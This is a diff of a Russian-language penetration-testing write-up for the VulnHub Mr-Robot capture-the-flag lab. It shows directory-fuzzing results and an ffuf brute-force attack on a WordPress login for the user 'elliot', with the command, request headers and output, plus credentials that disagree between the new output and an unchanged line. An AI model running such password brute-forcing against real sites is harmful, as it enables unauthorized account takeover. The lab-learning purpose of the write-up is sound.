@@ -149,6 +149,10 @@ phpmyadmin              [Status: 403, Size: 94, Words: 14, Lines: 1, Duration: 1
 xmlrpc                  [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 958ms]
 IMAGE                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 855ms]
 wp-signup               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 798ms]
+KeithRankin%20          [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 952ms]
+kaspersky%20            [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 884ms]
+page01                  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1518ms]
+Cirque%20du%20soleil%20 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1578ms]
 ```
 
 ### wpscan
@@ -320,10 +324,10 @@ ELLIOT                  [Status: 200, Size: 3659, Words: 144, Lines: 59, Duratio
 ### Вывод по бенчмарку
 `ffuf` на 30% быстрее, чем `hydra` для этой задачи, но не поддерживает возобновление после сбоя/прерывания
 
-### Получил доступ к панели
+Фаззинг пароля
 ```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
-└─$ ffuf -request ./post.txt -t 40 -request-proto http -w ./fsocity_filtered.txt -ic -c -fs 3659
+└─$ ffuf -request ./post.txt -t 40 -request-proto http -w ./fsocity_filtered.txt -ic -c -fc 200 
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -338,29 +342,29 @@ ________________________________________________
  :: Method           : POST
  :: URL              : http://192.168.56.129/wp-login.php
  :: Wordlist         : FUZZ: /home/kali/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits/fsocity_filtered.txt
- :: Header           : Origin: http://192.168.56.129
- :: Header           : Connection: keep-alive
- :: Header           : Upgrade-Insecure-Requests: 1
- :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
- :: Header           : Accept-Encoding: gzip, deflate, br
- :: Header           : Accept-Language: en-US,en;q=0.5
- :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Header           : Referer: http://192.168.56.129/wp-login.php
- :: Header           : Cookie: s_cc=true; s_fid=79C0FCABB9686E81-21543240C5D7C7BB; s_nr=1753192766411; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
  :: Header           : Priority: u=0, i
  :: Header           : Host: 192.168.56.129
  :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+ :: Header           : Connection: keep-alive
+ :: Header           : Referer: http://192.168.56.129/wp-login.php
+ :: Header           : Cookie: s_cc=true; s_fid=79C0FCABB9686E81-21543240C5D7C7BB; s_nr=1753192766411; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
+ :: Header           : Upgrade-Insecure-Requests: 1
+ :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ :: Header           : Accept-Language: en-US,en;q=0.5
+ :: Header           : Accept-Encoding: gzip, deflate, br
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Header           : Origin: http://192.168.56.129
  :: Data             : log=elliot&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.129%2Fwp-admin%2F&testcookie=1
  :: Follow redirects : false
  :: Calibration      : false
  :: Timeout          : 10
  :: Threads          : 40
  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Response size: 3659
+ :: Filter           : Response status: 200
 ________________________________________________
 
-20150603025145          [Status: 200, Size: 1512, Words: 1, Lines: 1, Duration: 1573ms]
-[WARN] Caught keyboard interrupt (Ctrl-C)
+ER28-0652               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1680ms]
+:: Progress: [11451/11451] :: Job [1/1] :: 58 req/sec :: Duration: [0:10:57] :: Errors: 13 ::
 ```
 
 Креды `elliot:20150603025145`
